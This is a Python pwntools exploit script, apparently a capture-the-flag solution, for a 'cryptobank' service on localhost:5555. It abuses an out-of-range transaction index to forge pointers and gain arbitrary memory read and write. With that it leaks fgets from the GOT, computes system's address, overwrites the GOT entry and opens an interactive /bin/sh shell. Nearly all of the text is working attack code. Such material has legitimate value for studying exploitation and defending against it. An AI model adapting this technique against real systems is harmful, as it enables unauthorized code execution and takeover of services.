#!/usr/bin/env python2
import re
from pwn import *


fgets_got = 0x746090
fgets_system_offset = 163520 # fgets - system


def create_account(p, username, password):
    p.recvuntil('> ')
    p.sendline('2')

    p.recvuntil('Username: ')
    p.sendline(username)

    p.recvuntil('Password: ')
    p.sendline(password)

    p.recvuntil('Currency: ')
    p.sendline('1')


def login(p, username, password):
    p.recvuntil('> ')
    p.sendline('1')

    p.recvuntil('Username: ')
    p.sendline(username)

    p.recvuntil('Password: ')
    p.sendline(password)


def logout(p):
    p.recvuntil('> ')
    p.sendline('6')


def make_transaction(p, recipient, amount, comment):
    p.recvuntil('> ')
    p.sendline('2')

    p.recvuntil('Username of recipient: ')
    p.sendline(recipient)

    p.recvuntil('Amount: ')
    p.sendline(str(amount))

    p.recvuntil('Comment (optional): ')
    p.sendline(comment)


def update_comment(p, index, comment):
    p.recvuntil('> ')
    p.sendline('5')

    p.recvuntil('Index of transaction: ')
    p.sendline(str(index))

    p.recvuntil('New comment: ')
    assert b'\n' not in comment
    p.sendline(comment)


def show_transactions(p):
    p.recvuntil('> ')
    p.sendline('1')

    p.recvuntil('Transactions:\n')

    data = []
    while True:
        line = p.recvline()

        r = re.match(r"^  From: '(.*)' To: '(.*)' Amount: (\d+) Comment: '(.*)'\n$", line)
        if not r:
            return data

        data.append({'from': r.group(1),
                     'to': r.group(2),
                     'amount': int(r.group(3)),
                     'comment': r.group(4)})

    return data


#context.log_level = 'debug'
#p = process('./cryptobank')
p = remote('localhost', 5555)
#gdb.attach(p)

# Create 4 accounts
for username in ('maxima', 'palkeo', 'patate', 'toffan'):
    create_account(p, username, 'password')

# Log-in as maxima (first account)
login(p, 'maxima', 'password')

# Create transactions from maxima to patate (third account)
make_transaction(p, 'patate', 1, 'comment')
make_transaction(p, 'patate', 1, '/bin/sh')

# Log-out
logout(p)


# Setup complete, now define read_mem and write_mem


def update_transaction_comment_pointer(p, address):
    # Use the overflow in user_update_transaction_comment to overwrite the
    # first transaction of patate
    login(p, 'maxima', 'password')

    # maxima->transactions.ptr[index].comment
    # = maxima->transactions.ptr + index * 32 + 16
    # = 0x60c000000040 + index * 32 + 16

    # we want to read something in the accounts array,
    # and we know that accounts.ptr = 0x611000000040

    # with index = 10737418244 we will have
    # comment = accounts.ptr[2].transactions.ptr
    index = 10737418244

    # The payload is a fake transaction {src, dest, comment}
    payload = b''
    # src = maxima
    # Little trick here: ff will be replaced by 00 because of:
    # comment[strlen(comment)-1] = '\0';
    payload += p64(0x61100000ff40)
    # dest = maxima
    payload += p64(0x611000000040)
    # comment = address
    payload += p64(address)

    update_comment(p, index, payload)

    logout(p)


def read_mem_string(p, address):
    update_transaction_comment_pointer(p, address)
    login(p, 'patate', 'password')
    transactions = show_transactions(p)
    logout(p)
    return transactions[0]['comment']


def read_nbytes(p, address, n):
    data = b''

    while len(data) < n:
        data += read_mem_string(p, address + len(data)) + '\x00'

    return data[:n]


def write_mem(p, address, payload):
    update_transaction_comment_pointer(p, address)
    login(p, 'patate', 'password')
    update_comment(p, 0, payload)
    logout(p)


log.info('Leaking libc')
fgets_libc = u64(read_nbytes(p, fgets_got, 8))
system_libc = fgets_libc - fgets_system_offset
log.info('fgets address: 0x%x', fgets_libc)
log.info('system address: 0x%x', system_libc)

log.info('Overwriting GOT')
payload = p64(system_libc)
payload = payload.rstrip('\x00')
write_mem(p, fgets_got, payload)

log.info('Calling system("/bin/sh")')
login(p, 'patate', 'password')

p.recvuntil('> ')
p.sendline('5')

p.recvuntil('Index of transaction: ')
p.sendline('1')

p.recvuntil('New comment: ')
p.interactive()
